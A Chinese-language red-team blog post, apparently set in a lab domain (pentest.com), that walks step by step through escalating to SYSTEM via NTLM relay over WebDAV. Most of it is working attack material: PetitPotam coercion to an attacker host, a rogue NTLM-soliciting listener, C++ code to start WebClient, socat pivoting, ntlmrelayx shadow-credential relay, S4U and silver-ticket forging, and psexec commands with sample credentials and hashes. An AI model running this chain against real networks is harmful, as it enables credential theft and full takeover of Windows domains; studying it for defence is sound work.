---
title: Privilege Escalation - NTLM Relay over HTTP (Webdav)
date: 2022-05-02 16:25:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Active Directory", "NTLM Relay", "Webdav"]
layout: post  
---

很多时候，NTLM Relay 并没有我们想象的那么完美。例如，在对 LDAP/s 这种协商签名的服务执行 NTLM Relay 时，如果在 Net-NTLM Hash 交换期间设置了协商签名标志，则目标服务器将忽略未签名的消息，从而导致攻击失败。幸运的是，并非所有客户端都设置了协商签名标志，如果客户端不支持签名，那么服务器是不会强制签名的。



在强制身份验证中，有很多服务可以支持身份验证，最常利用的服务可能就是 SMB 了。但是，从近几年攻击的角度来看，很多时候 SMB 协议并不理想。因为 SMB 协议将导致协商签名的服务器对 NTLM 认证请求强制签名，最终导致攻击失败。因此，越来越多的黑客将利用的角度转向了那些不支持签名的客户端，例如 HTTP，最常见的就是臭名昭著的 WebDAV。

## Webdav

WebDAV（Web-based Distributed Authoring and Versioning，基于 Web 的分布式编写和版本控制）是一种基于 HTTP 的通信协议。它扩展了 HTTP，在 GET、POST、HEAD 等几个 HTTP 标准方法以外添加了一些新的方法，使应用程序可对 Web Server 直接读写，并支持写文件锁定（Locking）及解锁（Unlock），还可以支持文件的版本控制。WebDAV 有利于用户间协同编辑和管理存储在万维网服务器文档。

Windows 使用 WebClient 服务实现 WebDAV，允许 Windows 应用程序通过使用 WebDAV 来创建、读取和写入 Internet 文件服务器上的文件，并使用 HTTP 进行通信。如果停止该服务，这些功能将不再可用；如果该服务被禁用，那么以来该服务的其他服务将无法启动。

## Coercing Authentication From Webdav

在强制身份验证中，我们可以通过 WebDAV 代替 SMB，并通过以下格式的 UNC 路径访问攻击者的 HTTP 服务器：

```python
\\evilhost@80\webdav\test.txt
```

尽管这种路径与 SMB 协议中默认的 UNC 路径差别很小，但带来的影响非常巨大。效果上最明显的区别在于，客户端不再使用 SMB 协议，而是会使用 HTTP 协议（WebDAV），从而在 Relay To LDAP/s 中绕过签名。并且，这样做还有一个好处就是攻击者的 HTTP 服务器可以在任何端口上运行，从红队的角度来看，这提供了很大的灵活性，其允许我们避免处理已经绑定的 SMB 端口。

当对启用 WebDAV 的 UNC 路径触发文件操作时，客户端主机将与 WebDAV 服务器执行如下交互过程：


1. 客户端发出一个 OPTIONS 方法来发现服务器支持的请求方法。
2. 如果支持 PROPFIND 方法，则发出 PROPFIND 请求来发现目录结构。
3. 如果服务器以 401 Unauthorized 响应并通过 WWW-Authenticate 标头请求 NTLM 身份验证，则 WebDAV 将继续启动 NTLM 质询响应身份验证，最终将 Net-NTLM Hash 提供给服务器。

为了更加直观，我们可以使用 Netcat 在攻击者的机器上启动一个 Socket 监听，例如监听本地 TCP 80 端口，如下图所示。

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220514234016724.png)

为了能让开启了 WebClient 服务的客户端成功访问到了我们，我们需要通过已获取的域用户权限，在域内为攻击机添加一个 DNS 记录。因为在默认情况下，WebClient 仅对本地内部网（Local Intranet）或受信任的站点（Trusted Sites）列表中的目标使用 “默认凭据” 进行身份验证。这里我们可以使用 Dirk-jan Mollema（[@dirkjanm](https://twitter.com/_dirkjan)）的 [dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) 工具来完成，如下图所示。

```bash
python3 dnstool.py -u pentest.com\\Marcus -p Marcus\@123 -r evilhost.pentest.com -d 172.26.10.134 --action add dc01.pentest.com
```

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220514235033017.png)

然后，我们可以通过 PetitPotam 强制开启了 WebClient 服务的客户端连接到攻击机的 80 端口，如下图所示。

```bash
python3 PetitPotam.py -d pentest.com -u marcus -p Marcus\@123 evilhost@80/webdav 172.26.10.21
```

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515013843612.png)

如上图所示，Netcat 上收到了一个 HTTP OPTIONS 请求。根据 `User-Agent` 头部字段的值，我们可知这仅仅是一个 WebDAV 请求。为了让客户端对我们的 80 端口执行身份验证，我们应该回复并发送身份认证请求，相关数据如下：

```http
HTTP/1.1 401 Unauthorized
Server: Microsoft-IIS/7.5
Date: Sat, 14 May 2022 16:53:29 GMT
Content-Type: text/html
WWW-Authenticate: NTLM
Content-Length: 0

```

为了完成该任务，我创建了一个简单的 Python 脚本，使用 Socket 在任意端口上监听，然后向连接该 Socket 的第一个客户端发送一个上述 HTTP 响应：

```python
# -*- coding: UTF-8 -*-
import socket    

response = '''HTTP/1.1 401 Unauthorized
Server: Microsoft-IIS/7.5
Date: Sat, 14 May 2022 16:53:29 GMT
Content-Type: text/html
WWW-Authenticate: NTLM
Content-Length: 0

'''.replace("\n","\r\n")

 
server = socket.socket()
host = '0.0.0.0'
port = 80
server.bind((host, port))
 
server.listen(5)
print(f'[*] Server listening on {host}:{port}...')

while True:
  conn, addr = server.accept()
  print('Connection Address:', addr)
  rev = conn.recv(1024).decode()
  print(rev)
  conn.send(response.encode())
  conn.close()

  if 'Authorization:' in rev:
    break
```

如下图所示，当客户端再次连接到攻击机的 80 端口时，将向攻击机执行 NTLM 身份验证：

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515014102864.png)

## NTLM Relay over HTTP (Webdav)

虽然 WebDAV 可以帮助我们强制客户端执行身份验证，但是有一个必要条件就是客户端系统上必须安装并启用 WebClient 服务。尽管这是 Workstation 版本系统上的默认设置，但并不适用于 Server 版本系统。在 Server 版本系统上，我们仍然需要通过附加功能来安装并启用 WebDAV 组件。

此外，虽然绝大多数系统服务的启动需要提升的权限，但是低权限用户仍然可以通过调用服务控制管理器（Services Control Manager，SCM）来启动 WebClient 服务，相关代码参考自 [SysExec](https://github.com/NotGlop/SysExec)：

```c++
#include <windows.h>
#include <evntprov.h>
#include <iostream>

void StartWebClientService()
{
	REGHANDLE hReg;
	bool success = false;
	const GUID WebClientServiceTrigger =
	{ 0x22B6D684, 0xFA63, 0x4578,
	{ 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7 } };

	if (EventRegister(&WebClientServiceTrigger, NULL, NULL, &hReg) == ERROR_SUCCESS)
	{
		EVENT_DESCRIPTOR eDesc;
		EventDescCreate(&eDesc, 1, 0, 0, 4, 0, 0, 0);
		success = EventWrite(hReg, &eDesc, 0, nullptr) == ERROR_SUCCESS;
		EventUnregister(hReg);
	}

	// Now wait for the service to be running

	SC_HANDLE schSCM;
	SC_HANDLE schSvc;
	SERVICE_STATUS ssStatus;
	schSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (NULL == schSCM)
		printf("[-] Failed OpenSCManager: %d\n", GetLastError());

	schSvc = OpenService(schSCM, L"WebClient", SERVICE_QUERY_STATUS);
	if (NULL == schSvc)
		printf("[-] Failed OpenService: %d\n", GetLastError());
	do
		QueryServiceStatus(schSvc, &ssStatus);
	while (ssStatus.dwCurrentState != SERVICE_RUNNING);
	printf("[*] WebClient service started.\n");

	CloseServiceHandle(schSvc);
	CloseServiceHandle(schSCM);

	return;
}

int main()
{
	StartWebClientService();
}
```

因此我们可以探索一种本地提权方法，大致就是在客户端机器上启动 WebClient 服务，然后通过 WebClient 执行 NTLM Relay To LDAP/s，为当前机器设置 `msDS-KeyCredentialLink` 或 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性，并最终通过 [Shadow Credentials](https://whoamianony.top/shadow-credentials/) 或 [RBCD](https://whoamianony.top/domain-delegation-attack/#%20%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE) 等方法提升权限。

我们以下图所示的网络环境为例，对相关利用步骤进行测试。假设攻击者已经获取了 WEB01 的控制权，并在该机器上设置 Socks5 代理进入内网。右侧的内网环境不出网，但相互之间可以访问。

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515110214613.png)

|    节点    |      主机名（FQDN）       |                     IP                     |
| :--------: | :-----------------------: | :----------------------------------------: |
|   WEB01    |    ubuntu.pentest.com     | IP 1：172.26.10.137<br>IP 2：192.168.2.165 |
|     DC     |     dc01.pentest.com      |                172.26.10.11                |
|     CA     |     adcs.pentest.com      |                172.26.10.12                |
|   CLIENT   | win10-client1.pentest.com |                172.26.10.21                |
| Kali Linux |                           |               192.168.2.148                |

假设我们已经获取了一个域标准用户（Pentest\Marcus）权限，并成功登陆了客户端主机 WIN10-CLIENT1。然后我们通过执行 StartWebClientService 在 WIN10-CLIENT1 上启动 WebClient 服务，如下图所示。

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515020421121.png)

由于内网主机 WIN10-CLIENT1 无法出网，因此无法直接通过代理执行 NTLM Relay，不过我们可以通过已经沦陷的 WEB01 作为中转。如下所示，在 Ubuntu 上执行以下命令，将 WEB01 上 8080 端口接收到的数据转发到 Kali Linux 上的 80 端口：

```bash
socat tcp-listen:8080,reuseaddr,fork tcp:192.168.2.148:80
```

然后，我们在 Kali Linux 上启动 ntlmrelayx.py 监听，等待受害机连接，如下图所示。

```bash
proxychains4 python3 ntlmrelayx.py -domain pentest.com -t ldaps://dc01.pentest.com --shadow-credentials --shadow-target win10-client1\$
```

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515103933264.png)

通过 PetitPotam 强制 WIN10-CLIENT1 对 WEB01 的 8080 端口执行身份验证，验证请求将通过端口转发到 Kali Linux 的 80 端口上，并由 ntlmrelayx.py 接收。

```bash
proxychains4 python3 PetitPotam.py -d pentest.com -u Marcus -p Marcus\@123 ubuntu@8080/webdav 172.26.10.21
```

如下图所示，执行 PetitPotam 后，ntlmrelayx.py 捕获身份验证请求后，将其中继到 LDAP/s 并成功为 WIN10-CLIENT1 设置 `msDS-KeyCredentialLink`。

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515103844068.png)

在 ntlmrelayx.py 的末尾给出了后续 PKINITtools 的利用命令，执行该命令可以为 WIN10-CLIENT1 请求 TGT 票据，如下图所示。

```bash
proxychains4 python3 ~/PKINITtools/gettgtpkinit.py -cert-pfx tE3so2th.pfx -pfx-pass ybZgtDIWaNNcDfv5Rh85 pentest.com/win10-client1$ tE3so2th.ccache
```

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515104039699.png)

### S4U To SYSTEM

有了 WIN10-CLIENT1 账户的 TGT 后，我们可以通过 Kerberos 的 S4U2Self 扩展协议，为域管理员用户申请针对 WIN10-CLIENT1 上 CIFS 服务的 ST 票据，如下图所示。

```bash
proxychains4 python3 ~/PKINITtools/gets4uticket.py kerberos+ccache://pentest.com\\win10-client1\$:tE3so2th.ccache@dc01.pentest.com cifs/win10-client1.pentest.com@pentest.com Administrator@pentest.com Administrator.ccache -v
```

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515104132460.png)

然后，我们通过设置环境变量 `KRB5CCNAME` 来使用 Administrator 用户的票据，并通过 psexec.py 获取 WIN10-CLIENT1 的 SYSTEM 权限，如下图所示。

```bash
export KRB5CCNAME=Administrator.ccache
proxychains4 python3 psexec.py -k pentest.com/Administrator@win10-client1.pentest.com -no-pass
```

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515104316788.png)

### Create a Silver Ticket

此外，在使用证书进行 Kerberos PKINIT 身份验证的时候，可以通过解密 PAC 结构直接获取用户的 NTLM 凭据，如下图所示。

```bash
export KRB5CCNAME=tE3so2th.ccache
proxychains4 python3 ~/PKINITtools/getnthash.py -key f0386cb579ba5f039a61a49fbde2e612822b80eff81434925d3f16a3f033af06 -dc-ip 172.26.10.11 pentest.com/win10-client1\$
```

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515113257597.png)

获取 WIN10-CLIENT1 账户的 NTLM Hash后，再通过 lookupsid.py 查看域 SID，如下图所示。

```bash
python3 lookupsid.py pentest.com/Marcus:Marcus\@123@dc01.pentest.com
```

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220517084340037.png)


现在我们可以对 WIN10-CLIENT1 机器的 HOST 服务伪造白银票据，如下图所示。

```bash
proxychains4 python3 ticketer.py -domain-sid S-1-5-21-1536491439-3234161155-253608391 -domain pentest.com -spn host/win10-client1.pentest.com -nthash c4cc14098ac9587dea92f952457be6aa Administrator
```

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515113708829.png)

最后，通过设置环境变量 `KRB5CCNAME` 来使用票据，并通过 psexec.py 获取 WIN10-CLIENT1 的 SYSTEM 权限，如下图所示。

```bash
export KRB5CCNAME=Administrator.ccache
proxychains4 python3 psexec.py -k pentest.com/Administrator@win10-client1.pentest.com -no-pass
```

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220515113832504.png)
## Ending......
